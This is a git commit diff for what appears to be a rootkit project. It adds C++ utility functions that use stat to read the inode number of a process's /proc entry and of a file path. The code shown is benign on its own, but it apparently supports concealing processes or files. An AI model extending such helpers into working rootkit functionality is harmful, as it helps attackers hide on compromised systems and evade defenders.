eed42c0a494afa0b670c818972a910459015d773
ViliamKovac1223 <viliamkovac1223@gmail.com>
2026-04-29 11:58:52 +0200

    add implementation utils function for better inode reading

--- src/rootkit/Utils.cpp
+++ src/rootkit/Utils.cpp
@@ -1,4 +1,5 @@
 #include "rootkit/Utils.hpp"
+#include <sys/stat.h>
 
 namespace rootkit::utils {
 
@@ -10,6 +11,29 @@ std::optional<__u32> convert_ip(const std::string& ip) {
     }
 
     return ip_address;
+}
+
+std::optional<uint64_t> get_inode_of_process(const pid_t pid) {
+    struct stat sb;
+    std::string proc_path = "/proc/" + std::to_string(pid);
+    
+    if (stat(proc_path.c_str(), &sb) < 0) {
+        perror("stat failed");
+        return std::nullopt;
+    }
+
+    return static_cast<uint64_t>(sb.st_ino);
+}
+
+std::optional<uint64_t> get_inode_of_file(const std::string& file_path) {
+    struct stat sb;
+    
+    if (stat(file_path.c_str(), &sb) < 0) {
+        perror("stat failed");
+        return std::nullopt;
+    }
+
+    return static_cast<uint64_t>(sb.st_ino);
 }
 
 }
